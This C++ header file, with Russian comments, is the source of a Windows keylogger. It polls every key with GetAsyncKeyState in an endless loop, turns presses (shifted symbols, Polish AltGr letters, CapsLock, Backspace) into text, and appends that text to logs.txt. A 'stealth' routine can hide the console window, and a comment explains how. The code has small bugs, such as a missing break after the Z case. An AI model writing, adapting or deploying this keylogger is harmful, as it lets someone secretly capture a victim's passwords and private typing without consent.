#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>

bool is_capslock = false;
int BackSp = 0;  //Переменная для BackSpace


//Начало. Запись лога.
int save(int key)
{
std::ofstream out_file;
out_file.open("logs.txt", std::ios_base::app);
std::string sLogs = "";
time_t t = time(0);
//Конец. Запись лога.


switch (key) {

 //Начало. Цифровая клавиатура.
 //Почему case не с 1&  Потому как используется десятичное число кодов клавиш.
 //Клавиша 0 (ноль) имеет код 96
case 96:
  BackSp = 0;
    sLogs += "0";
  break;
case 97:
    BackSp = 0;
    sLogs += "1";
    break;
case 98:
    BackSp = 0;
    sLogs += "2";
    break;
case 99:
    BackSp = 0;
    sLogs += "3";
    break;
case 100:
    BackSp = 0;
    sLogs += "4";
    break;
case 101:
    BackSp = 0;
    sLogs += "5";
    break;
case 102:
    BackSp = 0;
    sLogs += "6";
    break;
case 103:
    BackSp = 0;
    sLogs += "7";
    break;
case 104:
    BackSp = 0;
    sLogs += "8";
    break;
case 105:
  BackSp = 0;
  sLogs += "9";
  break;
// Конец. Цифровая клавиатура

//Начало. Клавиатура вверху.
case 48:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += ")";
    }
    else
        sLogs += "0";
    break;
case 49:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "!";
    }
    else
        sLogs += "1";
    break;
case 50:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "@";
    }
    else
        sLogs += "2";
    break;
case 51:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "#";
    }
    else
        sLogs += "3";
    break;
case 52:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "$";
    }
    else
        sLogs += "4";
    break;
case 53:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "%";
    }
    else
        sLogs += "5";
    break;
case 54:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "^";
    }
    else
        sLogs += "6";
    break;
case 55:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "&";
    }
    else
        sLogs += "7";
    break;
case 56:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "*";
    }
    else
        sLogs += "8";
    break;
case 57:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "(";
    }
    else
        sLogs += "9";
    break;
//Конец. Клавиатура вверху

//Начало. Ввод набора букв с клавиатуры.
//Используем таблицу символов Юников (Unicode)
//Например, код &#260 соответствует латинской заглавной букве А
case 65:
    BackSp = 0;
  if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        if (GetAsyncKeyState(VK_MENU)) {
      sLogs += "&#260";
    }
    else
            sLogs += "A";
    }
  else {
    if (GetAsyncKeyState(VK_MENU)) {
      sLogs += "&#261";
    }
        else
            sLogs += "a";
    }
    break;
case 66:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "B";
    }
    else
        sLogs += "b";
    break;
case 67:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#262";
        }
        else {
            sLogs += "C";
        }
    }
    else {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#263";
        }
        else {
            sLogs += "c";
        }
    }
    break;
case 68:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "D";
    }
    else
        sLogs += "d";
    break;
case 69:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#280";
        }
        else {
            sLogs += "E";
        }
    }
    else {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#281";
        }
        else {
            sLogs += "e";
        }
    }
    break;
case 70:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "F";
    }
    else
        sLogs += "f";
    break;
case 71:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "G";
    }
    else
        sLogs += "g";
    break;
case 72:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "H";
    }
    else
        sLogs += "h";
    break;
case 73:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "I";
    }
    else
        sLogs += "i";
    break;
case 74:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "J";
    }
    else
        sLogs += "j";
    break;
case 75:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "K";
    }
    else
        sLogs += "k";
    break;
case 76:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#321";
        }
        else {
            sLogs += "L";
        }
    }
    else {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&322";
        }
        else {
            sLogs += "l";
        }
    }
    break;
case 77:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "M";
    }
    else
        sLogs += "m";
    break;
case 78:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#323";
        }
        else {
            sLogs += "N";
        }
        break;
    }
    else {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#324";
        }
        else {
            sLogs += "n";
        }
    }
    break;
case 79:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#211";
        }
        else {
            sLogs += "O";
        }
        break;
    }
    else {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#243";
        }
        else {
            sLogs += "o";
        }
    }
    break;
case 80:
  BackSp = 0;
  if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
    sLogs += "P";
    break;
  }
  else
    sLogs += "p";
  break;
case 81:
  BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
    {
    sLogs += "Q";
    break;
     }
    else
    sLogs += "q";

  break;

case 82:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "R";
        break;
    }
    else
        sLogs += "r";
    break;
case 83:
    BackSp = 0;
  if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#346";
        }
        else {
            sLogs += "S";
        }
        break;
    }
    else {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "&#347";
        }
        else {
            sLogs += "s";
        }
    }
    break;
case 84:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "T";
        break;
    }
    else
        sLogs += "t";
    break;
case 85:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "U";
        break;
    }
    else {
        if (GetAsyncKeyState(VK_MENU)) {
            sLogs += "ˆ";
        }
        else {
            sLogs += "u";
        }
    }
    break;
case 86:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "V";
        break;
    }
    else
        sLogs += "v";
    break;
case 87:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "W";
        break;
    }
    else
        sLogs += "w";
    break;
case 88:
  BackSp = 0;
  if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
    if (GetAsyncKeyState(VK_MENU)) {
      sLogs += "&#377";
    }
    else {
      sLogs += "X";
    }
    break;
  }
  else {
    if (GetAsyncKeyState(VK_MENU)) {
      sLogs += "&#378";
    }
    else {
      sLogs += "x";
    }
  }
  break;
case 89:
    BackSp = 0;
    if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
        sLogs += "Y";
        break;
    }
    else
        sLogs += "y";
    break;
case 90:

  BackSp = 0;
  if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
    if (GetAsyncKeyState(VK_MENU)) {
      sLogs += "&#379";
    }
    else {
      sLogs += "Z";
    }
    break;
  }
  else {
    if (GetAsyncKeyState(VK_MENU)) {
      sLogs += "&#380";
    }
    else {
      sLogs += "z";
    }
  }

//Начало. Ввод набора букв с клавиатуры.
//Десятичные коды клавиш.
case 13:
    BackSp = 0;
  sLogs += "\n";
    break;
case 20:
    BackSp = 0;
    if (is_capslock == false) {
        is_capslock = true;
    sLogs += " [CapsLock] ";
    }
    else {
        is_capslock = false;
    sLogs += " [/CapsLock] ";
    }
    break;
case VK_BACK:
    BackSp += 1;
  sLogs += " [";
    sLogs += BackSp + '0';
    sLogs += "x";
  sLogs += "Backspace]";
    break;
case VK_SPACE:
    BackSp = 0;
    sLogs += " ";
    break;
case VK_MULTIPLY:
    BackSp = 0;
    sLogs += "*";
    break;
case VK_ADD:
    BackSp = 0;
    sLogs += "+";
    break;
case VK_SUBTRACT:
    BackSp = 0;
    sLogs += "-";
    break;
case VK_DECIMAL:
    BackSp = 0;
    sLogs += ".";
    break;
case VK_DIVIDE:
    BackSp = 0;
    sLogs += "/";
    break;
default:
    break;
}
//Конец. Ввод набора букв с клавиатуры.
out_file << sLogs; //Записывает данные
out_file.close();  //Закрываем запись
return 0;
}
//Начало. Видимость окна.
void stealth() {
HWND stealth;
AllocConsole();
stealth = FindWindowA("consoleWindowClass", NULL);
ShowWindow(stealth, 1);  //1-видим окно, 0 - невидмиое окно
}
//Конец. Видимость окна.
using namespace std;
int keylogger_func() {
stealth();

char buffer[MAX_PATH];
::GetModuleFileNameA(NULL, buffer, MAX_PATH);

char i;
while (1) {
    for (i = 8; i <= 190; i++) {
    if (GetAsyncKeyState(i) == -32767)
      save(i);
  }

}
return 0;
}

#endif
